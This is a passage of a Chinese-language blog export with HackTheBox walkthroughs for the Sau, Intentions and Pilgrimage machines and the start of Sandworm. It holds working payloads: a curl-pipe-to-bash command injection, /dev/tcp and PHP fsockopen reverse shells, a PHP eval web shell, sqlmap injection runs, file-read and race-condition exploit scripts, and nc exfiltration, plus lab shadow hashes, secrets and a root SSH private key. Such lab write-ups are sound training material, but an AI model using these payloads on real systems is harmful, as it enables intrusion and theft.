HackTrickshttps://book.hacktricks.xyz/windows-hardening/active-directory-methodology/ad-certificates/domain-escalation#misconfigured-certificate-templates-esc1 Help understanding limitations of “KDC_ERR_PADATA_TYPE_NOSUPP” · Issue #64 · ly4k/Certipyhttps://github.com/ly4k/Certipy/issues/64 Authenticating with certificates when PKINIT is not supported - Almond Offensive Security Bloghttps://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html AlmondOffSec/PassTheCert: Proof-of-Concept tool to authenticate to an LDAP/S server with a certificate through Schannelhttps://github.com/AlmondOffSec/PassTheCert","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Sau - HackTheBox","slug":"Sau-HackTheBox","date":"2023-07-10T06:21:40.000Z","updated":"2024-01-08T03:26:55.060Z","comments":true,"path":"2023/07/10/Sau-HackTheBox/","link":"","permalink":"https://darkwing.moe/2023/07/10/Sau-HackTheBox/","excerpt":"","text":"基本信息 https://app.hackthebox.com/machines/Sau 10.10.11.224 端口扫描22和55555开放，80被过滤： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475$ nmap -sC -sV -Pn 10.10.11.224Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-10 13:32 CSTNmap scan report for 10.10.11.224Host is up (0.10s latency).Not shown: 997 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 3072 aa:88:67:d7:13:3d:08:3a:8a:ce:9d:c4:dd:f3:e1:ed (RSA)| 256 ec:2e:b1:05:87:2a:0c:7d:b1:49:87:64:95:dc:8a:21 (ECDSA)|_ 256 b3:0c:47:fb:a2:f2:12:cc:ce:0b:58:82:0e:50:43:36 (ED25519)80/tcp filtered http55555/tcp open unknown| fingerprint-strings:| FourOhFourRequest:| HTTP/1.0 400 Bad Request| Content-Type: text/plain; charset=utf-8| X-Content-Type-Options: nosniff| Date: Mon, 10 Jul 2023 05:33:32 GMT| Content-Length: 75| invalid basket name; the name does not match pattern: ^[wd-_\\.]&#123;1,250&#125;$| GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie:| HTTP/1.1 400 Bad Request| Content-Type: text/plain; charset=utf-8| Connection: close| Request| GetRequest:| HTTP/1.0 302 Found| Content-Type: text/html; charset=utf-8| Location: /web| Date: Mon, 10 Jul 2023 05:33:04 GMT| Content-Length: 27| href=\"/web\"&gt;Found&lt;/a&gt;.| HTTPOptions:| HTTP/1.0 200 OK| Allow: GET, OPTIONS| Date: Mon, 10 Jul 2023 05:33:04 GMT|_ Content-Length: 01 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port55555-TCP:V=7.94%I=7%D=7/10%Time=64AB9810%P=x86_64-apple-darwin22.4SF:.0%r(GetRequest,A2,\"HTTP/1\\.0\\x20302\\x20Found\\r\\nContent-Type:\\x20text/SF:html;\\x20charset=utf-8\\r\\nLocation:\\x20/web\\r\\nDate:\\x20Mon,\\x2010\\x20JSF:ul\\x202023\\x2005:33:04\\x20GMT\\r\\nContent-Length:\\x2027\\r\\n\\r\\n&lt;a\\x20hreSF:f=\\\"/web\\\"&gt;Found&lt;/a&gt;\\.\\n\\n\")%r(GenericLines,67,\"HTTP/1\\.1\\x20400\\x20BadSF:\\x20Request\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnectSF:ion:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request\")%r(HTTPOptions,60,\"HTTP/1\\.SF:0\\x20200\\x20OK\\r\\nAllow:\\x20GET,\\x20OPTIONS\\r\\nDate:\\x20Mon,\\x2010\\x20JSF:ul\\x202023\\x2005:33:04\\x20GMT\\r\\nContent-Length:\\x200\\r\\n\\r\\n\")%r(RTSPRSF:equest,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/SF:plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20ReSF:quest\")%r(Help,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\SF:x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20BSF:ad\\x20Request\")%r(SSLSessionReq,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\SF:r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20closSF:e\\r\\n\\r\\n400\\x20Bad\\x20Request\")%r(TerminalServerCookie,67,\"HTTP/1\\.1\\xSF:20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-SF:8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20Request\")%r(TLSSessionReSF:q,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\x20text/plainSF:;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20Bad\\x20RequestSF:\")%r(Kerberos,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContent-Type:\\xSF:20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n400\\x20BaSF:d\\x20Request\")%r(FourOhFourRequest,EA,\"HTTP/1\\.0\\x20400\\x20Bad\\x20RequeSF:st\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nX-Content-Type-OSF:ptions:\\x20nosniff\\r\\nDate:\\x20Mon,\\x2010\\x20Jul\\x202023\\x2005:33:32\\x2SF:0GMT\\r\\nContent-Length:\\x2075\\r\\n\\r\\ninvalid\\x20basket\\x20name;\\x20the\\SF:x20name\\x20does\\x20not\\x20match\\x20pattern:\\x20\\^\\[\\\\w\\\\d\\\\-_\\\\\\.\\]&#123;1,2SF:50&#125;\\$\\n\")%r(LPDString,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20Request\\r\\nContentSF:-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\x20close\\r\\n\\r\\n4SF:00\\x20Bad\\x20Request\")%r(LDAPSearchReq,67,\"HTTP/1\\.1\\x20400\\x20Bad\\x20RSF:equest\\r\\nContent-Type:\\x20text/plain;\\x20charset=utf-8\\r\\nConnection:\\SF:x20close\\r\\n\\r\\n400\\x20Bad\\x20Request\");Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 129.02 seconds 55555是一个Request Baskets： Request Baskets简单测试就是创建baskets，接收请求： SSRFRequest-baskets 1.2.1版本，可以搜到已知SSRF漏洞： request-baskets SSRF details - CodiMDhttps://notes.sjtu.edu.cn/s/MUUhEymt7 根据前面nmap结果，直接SSRF 80端口，然后访问创建的路由发现Maltrail v0.53(注意需要把proxy_response设置为true，这样才会看到响应信息)： Maltrail这个可以搜到命令注入，在login的username参数里： Unauthenticated OS Command Injection in stamparm/maltrail vulnerability found in maltrailhttps://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/ 那就是同样的，新建路由，SSRF到login，然后利用命令注入： 1curl -X POST 'http://10.10.11.224:55555/miao3' --data 'username=;`curl http://10.10.14.12:7777/shell.sh | bash`' 打到puma用户： shell.sh12#!/bin/bash/bin/bash -i &gt;&amp; /dev/tcp/10.10.14.12/4444 0&gt;&amp;1 user flagpuma用户目录： 提权信息sudo运行system查看指定服务状态，标准的gtfobin： systemctl | GTFOBinshttps://gtfobins.github.io/gtfobins/systemctl/#sudo 现在已经有针对这个的CVE了，后续新版本这种方法就不行了： CVE - CVE-2023-26604https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-26604 提权 &amp; root flag按照gtfobins里的步骤： 123sudo /usr/bin/systemctl status trail.service!sh shadow12root:$6$4IguUssRBYl3&#x2F;LvG$MfnFD1Y9saTrvw2OqA1VtqKxa7TsDt1kb2qsJw6inQ8GfmnqIrh32eqk9IMO4UR3fYG.TzbJeiFd7UOu1QlGR0:19461:0:99999:7:::puma:$6$eB4LwfQg7IgQC38d$SktdHbU0gQAh0.BoRY36FHreH6xR073oHdRrk6hmvar4eZTnmkfxbUxsMBsaZMRm9XHYQF9hG4l5v6fefYdic&#x2F;:19461:0:99999:7::: 参考资料 request-baskets SSRF details - CodiMDhttps://notes.sjtu.edu.cn/s/MUUhEymt7 Unauthenticated OS Command Injection in stamparm/maltrail vulnerability found in maltrailhttps://huntr.dev/bounties/be3c5204-fbd9-448d-b97c-96a8d2941e87/ systemctl | GTFOBinshttps://gtfobins.github.io/gtfobins/systemctl/#sudo CVE - CVE-2023-26604https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-26604","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Intentions - HackTheBox","slug":"Intentions-HackTheBox","date":"2023-07-03T08:01:22.000Z","updated":"2023-10-16T01:27:02.575Z","comments":true,"path":"2023/07/03/Intentions-HackTheBox/","link":"","permalink":"https://darkwing.moe/2023/07/03/Intentions-HackTheBox/","excerpt":"","text":"基本信息 https://app.hackthebox.com/machines/Intentions 10.10.11.220 端口扫描22和80: 1234567891011121314151617$ nmap -sC -sV -Pn 10.10.11.220Starting Nmap 7.94 ( https://nmap.org ) at 2023-07-03 13:12 CSTNmap scan report for 10.10.11.220Host is up (0.078s latency).Not shown: 998 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)| ssh-hostkey:| 256 47:d2:00:66:27:5e:e6:9c:80:89:03:b5:8f:9e:60:e5 (ECDSA)|_ 256 c8:d0:ac:8d:29:9b:87:40:5f:1b:b0:a4:1d:53:8f:f1 (ED25519)80/tcp open http nginx 1.18.0 (Ubuntu)|_http-title: Intentions|_http-server-header: nginx/1.18.0 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 28.90 seconds 80图片库： gallery随意注册登录，进入gallery： Profile唯一可以输入的地方是Profile里设置偏好图片类型，然后会影响在feed里展示的图片： 二阶sql注入这种场景很大可能是二阶sql注入，验证存在： Second-order SQL injection - Tutorial &amp; Examples | Web Security Academyhttps://portswigger.net/web-security/sql-injection#second-order-sql-injection Second Order Injection - SQLMap - HackTrickshttps://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap/second-order-injection-sqlmap 后面参考sqlmap的payload，可以直接回显的： sqlmap支持二阶注入，需要保存两步请求包，--second-req参数使用第二个包： 123456789101112131415161718192021sqlmap -r genres.txt --level 3 --risk 3 --batch --dbs --tamper=space2comment --second-req feed.txt --threads 10available databases [2]:[*] information_schema[*] intentionssqlmap -r genres.txt --level 3 --risk 3 --batch --dbs --tamper=space2comment --second-req feed.txt --threads 10 -D intentions --tablesDatabase: intentions[4 tables]+------------------------+| gallery_images || migrations || personal_access_tokens || users |+------------------------+sqlmap -r genres.txt --level 3 --risk 3 --batch --dbs --tamper=space2comment --second-req feed.txt --threads 10 -D intentions -T users --dumpsteve@intentions.htb ： $2y$10$M/g27T1kJcOpYOfPqQlI3.YfdLIwr3EWbzWOLfpoTtjpeMqpp4twagreg@intentions.htb ： $2y$10$95OR7nHSkYuFUUxsT1KS6uoQ93aufmrpknz4jwRqzIbsUpRiiyU5m login v2得到的hash破解不出来，回到登录接口，注意到路径中的v1，修改为v2会发现需要hash参数： 使用通过sql注入得到的hash可以成功登录： 然后前面在数据库中也可以知道这是admin用户，直接访问admin即可： gallery adminnews里提到新图片需要附上版权信息，images里可以进行编辑： 测试编辑，根据请求响应信息，可能是LFI： LFI输入path必须是有效的图片格式，测试常规LFI无效，根据Discord提示用到的Trick(SCTF fumo_backdoor)： SCTF 2023 By W&amp;M - W&amp;M Teamhttps://blog.wm-team.cn/index.php/archives/38/ 1mvg:&#x2F;etc&#x2F;passwd[20x20+20+20] 后面就是一步步读文件： 123456789101112mvg:&#x2F;var&#x2F;www&#x2F;html&#x2F;intentions&#x2F;.env[20x20+20+20]APP_KEY&#x3D;base64:YDGHFO792XTVdInb9gGESbGCyRDsAIRCkKoIMwkyHHI&#x3D;...DB_CONNECTION&#x3D;mysqlDB_HOST&#x3D;localhostDB_PORT&#x3D;3306DB_DATABASE&#x3D;intentionsDB_USERNAME&#x3D;laravelDB_PASSWORD&#x3D;02mDWOgsOga03G385!!3Plcx...JWT_SECRET&#x3D;yVH9RCGPMXyzNLoXrEsOl0klZi3MAxMHcMlRAnlobuSO8WNtLHStPiOUUgfmbwPt 但没开debug模式，并不能直接打 lfi.pydiscord里给的脚本： 12345678910111213141516171819202122232425262728293031323334353637import requestsimport base64url = 'http://10.10.11.220/api/v2/admin/image/modify'headers = &#123; 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0', 'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'en-US,en;q=0.5', 'Accept-Encoding': 'gzip, deflate', 'X-Requested-With': 'XMLHttpRequest', 'Content-Type': 'application/json', 'X-XSRF-TOKEN': '?', 'Origin': 'http://10.10.11.220', 'Referer': 'http://10.10.11.220/admin', 'Cookie': 'intentions_session=??; token=??', &#125;def send_request(file_path): data = &#123; 'path': f'mvg:&#123;file_path&#125;[20x20+20+20]', 'effect': 'wave' &#125; response = requests.post(url, headers=headers, json=data) #print(response.status_code) #print(response.text) if response.status_code == 200 and response.text.startswith('data:image/jpeg;base64,'): base64_str = response.text.split('data:image/jpeg;base64,')[1] decoded_str = base64.b64decode(base64_str).decode('utf-8') # decode base64 print(decoded_str) else: print(response.text) file_path = input(\"Enter the path to the file:\")send_request(file_path) Imagick 扩展 反序列化图像处理用的Imagick 扩展，path那里测试也可以通过http到我们可控的源图片，可以参考这个： Exploiting Arbitrary Object Instantiations in PHP without Custom Classes – PT SWARMhttps://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/ 用到的是RCE #2：VID 方案，自己手动就是intruder里同时发三个请求，discord里也给了脚本，替换脚本里必要参数，得到www-data： 1234convert xc:red -set 'Copyright' '&lt;?php @eval(@$_REQUEST[\"cmd\"]); ?&gt;' miao.pngpip3 install aiohttppython3 shell.py shell.pydiscord里给的： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071import asyncioimport aiohttpimport requestsheaders = &#123; 'Content-Type': 'application/json', 'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36', 'Cookie': 'token=&lt;token&gt;', 'Connection': 'close'&#125;header2 = &#123; \"Accept\": \"*/*\", \"Content-Type\": \"multipart/form-data; boundary=------------------------c32aaddf3d8fd979\"&#125;data1 = &#123; 'path': 'vid:msl:/tmp/php*', 'effect': 'charcoal'&#125;data2 = '''--------------------------c32aaddf3d8fd979Content-Disposition: form-data; name=\"swarm\"; filename=\"swarm.msl\"Content-Type: application/octet-stream&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;image&gt;&lt;read filename=\"http://&lt;tun&gt;:7777/miao.png\" /&gt;&lt;write filename=\"/var/www/html/intentions/public/miao.php\" /&gt;&lt;/image&gt;--------------------------c32aaddf3d8fd979--'''data3 = &#123; 'path': 'vid:msl:/var/www/html/intentions/public/index*', 'effect': 'charcoal'&#125;url = 'http://&lt;url&gt;/'url1 = url + \"api/v2/admin/image/modify\"url2 = url + \"miao.php\"async def send_requests(): async with aiohttp.ClientSession(headers=headers) as session: tasks = [] for _ in range(30): task1 = asyncio.ensure_future(session.post(url1, json=data1)) tasks.append(task1) task2 = asyncio.ensure_future(session.post(url1, headers=header2, data=data2)) tasks.append(task2) task3 = asyncio.ensure_future(session.post(url1, json=data3)) tasks.append(task3) responses = await asyncio.gather(*tasks) for response in responses: print(await response.text()) loop = asyncio.get_event_loop()loop.run_until_complete(send_requests())revshell = &#123; \"cmd\":\"\"\"$sock=fsockopen(\"&lt;tun&gt;\",4444);$proc=proc_open(\"sh\", array(0=&gt;$sock, 1=&gt;$sock, 2=&gt;$sock),$pipes);\"\"\"&#125;requests.post(url2, data=revshell)# Remember to modify &lt;tun&gt;,&lt;url&gt;,&lt;token&gt;# Execute the following command:#convert xc:red -set 'Copyright' '&lt;?php @eval(@$_REQUEST[\"cmd\"]); ?&gt;' miao.png #python3 -m http.server 7777#rlwrap nc -nlvp 4444 信息intentions里有git,但www-data没权限读，可以打包下载到本地来查看,得到greg密码： 123456789tar cvf /tmp/git.tar.gz .gitnc 10.10.14.11 4444 &lt; git.tar.gz# localrlwrap nc -nlvp 4444 &gt; git.tar.gzgit loggit diff 36b4287cf2fb356d868e71dc1ac90fc8fa99d319 f7c903a54cacc4b8f27e00dbf5b0eae4c16c3bb4$res = $test-&gt;postJson('/api/v1/auth/login', ['email' =&gt; 'greg@intentions.htb', 'password' =&gt; 'Gr3g1sTh3B3stDev3l0per!1998!']); user flaggreg账号密码登录，得到user flag： 提权信息greg用户在scanner组，/opt里也有个scanner程序，这个程序有读文件的特权，但只是给出对应文件的hash： 但注意有一个-l参数，可以指定读取的字节数来进行hash，简单测试： 那这样的话，我们就可以逐个字符爆破出任意文件内容(不确定是否是预期方法，但root用户提供了id_rsa用于读取) 提权 &amp; root flag方法就是计算出使用字符集的md5，然后逐个字符爆破指定文件,这里已经可以直接读root flag了，但也给了root id_rsa： root_id_rsa1234567891011121314151617181920212223242526272829303132333435363738-----BEGIN OPENSSH PRIVATE KEY-----b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcnNhAAAAAwEAAQAAAYEA5yMuiPaWPr6P0GYiUi5EnqD8QOM9B7gm2lTHwlA7FMw95&#x2F;wy8JW3HqEMYrWSNpX2HqbvxnhOBCW&#x2F;uwKMbFb4LPI+EzR6eHr5vG438EoeGmLFBvhge54WkTvQydvk6xqxjypi3PivKnI2Gm+BWzcMi6kHI+NLDUVn7aNthBIg9OyIVwp7LXl3cgUrWM4StvYZZyGpITFR&#x2F;1KjaCQjLDnshZO7OrM&#x2F;PLWdyipq2yZtNoB57kvzbPRpXu7ANbM8wV3cyk&#x2F;OZt0LZdhfMuJsJsFLhZufADwPVRK1B0oMjcnljhUuVvYJtm8Ig&#x2F;8fC9ZEcycF69E+nBAiDuUmkDAhdj0ilD63EbLof4rQmBuYUQPy&#x2F;KMUwGujCUBQKw3bXdOMs&#x2F;jq6n8bK7ERcHIEx6uTdwgE6WlJQhgAp6hT7CiINq34Z2CFd9t2x1o24+JOAQj9JCubRa1fOMFs8OqEBiGQHmOIjmUj7x17Ygwfhs4O8AQDvjhizWop&#x2F;7Njg7Xm7ouxzoXdAAAFiJKKGvOSihrzAAAAB3NzaC1yc2EAAAGBAOcjLoj2lj6+j9BmIlIuRJ6g&#x2F;EDjPQe4JtpUx8JQOxTMPef8MvCVtx6hDGK1kjaV9h6m78Z4TgQlv7sCjGxW+CzyPhM0enh6+bxuN&#x2F;BKHhpixQb4YHueFpE70Mnb5OsasY8qYtz4rypyNhpvgVs3DIupByPjSw1FZ+2jbYQSIPTsiFcKey15d3IFK1jOErb2GWchqSExUf9So2gkIyw57IWTuzqzPzy1ncoqatsmbTaAee5L82z0aV7uwDWzPMFd3MpPzmbdC2XYXzLibCbBS4WbnwA8D1UStQdKDI3J5Y4VLlb2CbZvCIP&#x2F;HwvWRHMnBevRPpwQIg7lJpAwIXY9IpQ+txGy6H+K0JgbmFED8vyjFMBrowlAUCsN213TjLP46up&#x2F;GyuxEXByBMerk3cIBOlpSUIYAKeoU+woiDat+GdghXfbdsdaNuPiTgEI&#x2F;SQrm0WtXzjBbPDqhAYhkB5jiI5lI+8de2IMH4bODvAEA744Ys1qKf+zY4O15u6Lsc6F3QAAAAMBAAEAAAGABGD0S8gMhE97LUn3pC7RtUXPkytRSuqx1VWHu9yyvdWS5g8iToOVLQ&#x2F;RsP+hFga+jqNmRZBRlz6foWHIByTMcOeKH8&#x2F;qjD4O9wM8ho4U5pzD5q2nM3hR4G1g0Q4o8EyrzygQ27OCkZwi&#x2F;idQhnz&#x2F;8EsvtWRj&#x2F;D8G6ME9lopHlKdz4fg&#x2F;tj0UmcGgA4yF3YopSyM5XCv3xac+YFjwHKSgegHyNe3se9BlMJqfz+gfgTz38l9LrLiVoKS6JsCvEDe6HGSvyyG9eCg1mQ6J9EkaN2q0uKN35T5siVinK9FtvkNGbCEzFCPknyAdy792vSIuJrmdKhvRTEUwvntZGXrKtwnf81SX&#x2F;ZMDRJYqgCQyf5vnUtjKznvohz2R0i4lakvtXQYC&#x2F;NNc1QccjTL2NID4nSOhLH2wYzZhKku1vlRmK13HP5BRS0Jus8ScVaYaISbEDknHVWHFWndkuQSG2EX9a2auy7oTVCSu7bUXFnottatOxo1atrasNOWcaNkRgdehAAAAwQDUQfNZuVgdYWS0iJYoyXUNSJAmzFBGxAv3EpKMliTlb&#x2F;LJlKSCTTttuN7NLHpNWpn92SpNDghhIYENKoOUUXBgb26gtg1qwzZQGsYy8JLLwgA7g4RF3VD2lGCT377lMD9xv3bhYHPllo0L7jaj6PiWKD8Aw0StANo4vOv9bS6cjEUyTl8QM05zTiaFk&#x2F;UoG3LxoIDT6Vi8wY7hIBAhDZ6Tm44Mf+XRnBM7AmZqsYh8nw++rhFdr9d39pYaFgok9DcAAADBAO1D0v0&#x2F;2a2XO4DTAZdPSERYVIF2W5TH1Atdr37g7i7zrWZxltO5rrAt6DJ79W2laZ9B1Kus1EiXNYkVUZIarxYc6Mr5lQ1CSpl0a+OwyJK3Rnh5VZmJQvK0sicM9MyFWGfy7cXCKEFZuinhS4DPBCRSpNBazv25Fap0Whav4yqU7BsG2S&#x2F;mokLGkQ9MVyFpbnrVcnNrwDLd2&#x2F;whZoENYsiKQSWIFlx8GduCNB7UAUZ7mYFdcDBAJ6uQvPFDdphWPQAAAMEA+WN+VN&#x2F;TVcfYSYCFiSezNN2xAXCBkkQZX7kpdtTupr+gYhL6gv&#x2F;A5mCOSvv1BLgEl0A05BeWiv7FOkNX5BMR94&#x2F;NWOlS1Z3T0p+mbjD7F0nauYkSG+eLwFAd9K&#x2F;kcdxTuUlwvmPvQiNg70Z142bt1tKN8b3WbttB3sGq39jder8pnhPKs4TzMzb0gvZGGVZyjqX68coFz3k1nAb5hRS5Q+P6y&#x2F;XxmdBB4TEHqSQtQ4PoqDj2IPDVJTokldQ0d4ghAAAAD3Jvb3RAaW50ZW50aW9ucwECAw&#x3D;&#x3D;-----END OPENSSH PRIVATE KEY----- shadow1234root:$y$j9T$JjiD.nZgfr5ZSBdO4E9rY0$ZOElIJaX9F5qdpt54qFqtklDntYf&#x2F;yo4kEUqqD&#x2F;KFyA:19519:0:99999:7:::steven:$y$j9T$TM&#x2F;hbL&#x2F;SRCyk67reQMC9C&#x2F;$QHTiY3rtnGuQS1teQB7jrMys0eMkm7.tlnKFGrsoIa9:19391:0:99999:7:::greg:$y$j9T$&#x2F;LxemPBd1ROuQOmQY7OJ0&#x2F;$T7eTn0juiHsctWeX3GIOynHPuGKRiFMO1F.1zzPG696:19390:0:99999:7:::legal:$y$j9T$Sl&#x2F;k&#x2F;bJVnQR85nLW6kAwj1$lmrMHlaVA9&#x2F;xFczVtj92LsiLw7xpd4YYrmfJ7Yv37aD:19518:0:99999:7::: exp.py也是discord里给的： 1234567891011121314151617181920212223242526272829303132import osimport hashlibdef find_character(prefix, md5_hash): for char in range(256): test_string = prefix + chr(char) hashed_string = hashlib.md5(test_string.encode()).hexdigest() if hashed_string == md5_hash: return chr(char) return None def get_hash(file, length): data = os.popen(f\"/opt/scanner/scanner -p -s 123456 -c &#123;file&#125; -l &#123;length&#125;\").read() data_lines = data.split(\"\\n\") return data_lines[0].split()[-1] file = input(\"File path: \")content = \"\"cont = 1while True: try: partial_hash = get_hash(file, cont) new_char = find_character(content, partial_hash) content += new_char cont += 1 except: break print(os.system(\"clear\"))print(f\"Content of file &#123;file&#125;\")print(content) 参考资料 Second-order SQL injection - Tutorial &amp; Examples | Web Security Academyhttps://portswigger.net/web-security/sql-injection#second-order-sql-injection Second Order Injection - SQLMap - HackTrickshttps://book.hacktricks.xyz/pentesting-web/sql-injection/sqlmap/second-order-injection-sqlmap SCTF 2023 By W&amp;M - W&amp;M Teamhttps://blog.wm-team.cn/index.php/archives/38/ Exploiting Arbitrary Object Instantiations in PHP without Custom Classes – PT SWARMhttps://swarm.ptsecurity.com/exploiting-arbitrary-object-instantiations/","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Pilgrimage - HackTheBox","slug":"Pilgrimage-HackTheBox","date":"2023-06-26T06:25:56.000Z","updated":"2023-11-27T01:50:59.946Z","comments":true,"path":"2023/06/26/Pilgrimage-HackTheBox/","link":"","permalink":"https://darkwing.moe/2023/06/26/Pilgrimage-HackTheBox/","excerpt":"","text":"基本信息 https://app.hackthebox.com/machines/Pilgrimage 10.10.11.219 端口扫描22和80: 12345678910111213141516$ nmap -sC -sV -Pn 10.10.11.219Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-26 13:22 CSTNmap scan report for 10.10.11.219Host is up (0.098s latency).Not shown: 997 closed tcp ports (conn-refused)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)| ssh-hostkey:| 3072 20:be:60:d2:95:f6:28:c1:b7:e9:e8:17:06:f1:68:f3 (RSA)| 256 0e:b6:a6:a8:c9:9b:41:73:74:6e:70:18:0d:5f:e0:af (ECDSA)|_ 256 d1:4e:29:3c:70:86:69:b4:d7:2c:c8:0b:48:6e:98:04 (ED25519)80/tcp open http nginx 1.18.0|_http-title: Did not follow redirect to http://pilgrimage.htb/|_http-server-header: nginx/1.18.013783/tcp filtered netbackupService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel 80需要加hosts： 110.10.11.219 pilgrimage.htb 在线压缩图片的： 自己注册登录后测试功能就是上传图片，给出压缩后的图片 .git很容易发现git泄漏： dump代码分析： 1git-dumper http://pilgrimage.htb/.git git_dump magick根据代码可以知道图像处理是使用的magick，我们dump也得到有这个文件，是一个linux elf，测试运行发现是ImageMagick 7.1.0-49： ImageMagick搜索可以发现相关漏洞： ImageMagick: The hidden vulnerability behind your online images - Metabase Qhttps://www.metabaseq.com/imagemagick-zero-days/ voidz0r/CVE-2022-44268: A PoC for the CVE-2022-44268 - ImageMagick arbitrary file readhttps://github.com/voidz0r/CVE-2022-44268 就是按照readme 一步步来，本地用到了identify需要装一下imagemagick： 1234cargo run \"/etc/passwd\"brew install imagemagickidentify -verbose 649924974daec.png db根据前面代码中得到的sqlite数据库路径，读取数据库文件： 123cargo run \"/var/db/pilgrimage\"identify -verbose 649928a02e497.png 结合前面passwd得到的用户名emily，分隔出密码(也可以解码后内容作为sqlite文件读取)： 1emily abigchonkyboi123 user flag得到的账号密码登录，得到user flag: (目录下那些binwalk是别人放的) 提权信息运行pspy,发现root定时运行malwarescan.sh： malwarescan.sh查看代码，发现是对shrunk目录下的文件运行binwalk后进行检测，满足条件就删除： binwalkbinwalk 2.3.2版本，存在已知漏洞： Security Advisory: Remote Command Execution in binwalk - ONEKEYhttps://onekey.com/blog/security-advisory-remote-command-execution-in-binwalk/ Binwalk v2.3.2 - Remote Command Execution (RCE) - Python remote Exploithttps://www.exploit-db.com/exploits/51249 提权 &amp; root flag 按照exp说明一步步来： 12345python3 51249.py image.png 10.10.14.11 4444# targetcd /var/www/pilgrimage.htb/shrunk/wget http://10.10.14.11:7777/binwalk_exploit.png 触发，得到root： shadow12root:$y$j9T$wlP.1uHMf0rRNBijw8HHv.$LLm1qK9ISnryNLz6wa0asgaOotvT7nbGC7py0d5nYoD:19398:0:99999:7:::emily:$y$j9T$ktYE1a41rPMM9Qc8UOjaz0$kQrcvH7mLwn&#x2F;xsppIViwVr01zcx8jFQWK4pl7lQicq0:19412:0:99999:7::: 参考资料 arthaud/git-dumper: A tool to dump a git repository from a websitehttps://github.com/arthaud/git-dumper ImageMagick: The hidden vulnerability behind your online images - Metabase Qhttps://www.metabaseq.com/imagemagick-zero-days/ voidz0r/CVE-2022-44268: A PoC for the CVE-2022-44268 - ImageMagick arbitrary file readhttps://github.com/voidz0r/CVE-2022-44268 Security Advisory: Remote Command Execution in binwalk - ONEKEYhttps://onekey.com/blog/security-advisory-remote-command-execution-in-binwalk/ Binwalk v2.3.2 - Remote Command Execution (RCE) - Python remote Exploithttps://www.exploit-db.com/exploits/51249","categories":[],"tags":[{"name":"HackTheBox","slug":"HackTheBox","permalink":"https://darkwing.moe/tags/HackTheBox/"}]},{"title":"Sandworm - HackTheBox","slug":"Sandworm-HackTheBox","date":"2023-06-19T07:53:38.000Z","updated":"2023-11-20T01:49:30.327Z","comments":true,"path":"2023/06/19/Sandworm-HackTheBox/","link":"","permalink":"https://darkwing.moe/2023/06/19/Sandworm-HackTheBox/","excerpt":"","text":"基本信息 https://app.hackthebox.com/machines/Sandworm 10.10.11.218 端口扫描22，80，443: 12345678910111213141516171819202122232425$ nmap -sC -sV -Pn 10.10.11.218Starting Nmap 7.94 ( https://nmap.org ) at 2023-06-19 13:35 CSTNmap scan report for 10.10.11.218Host is up (0.093s 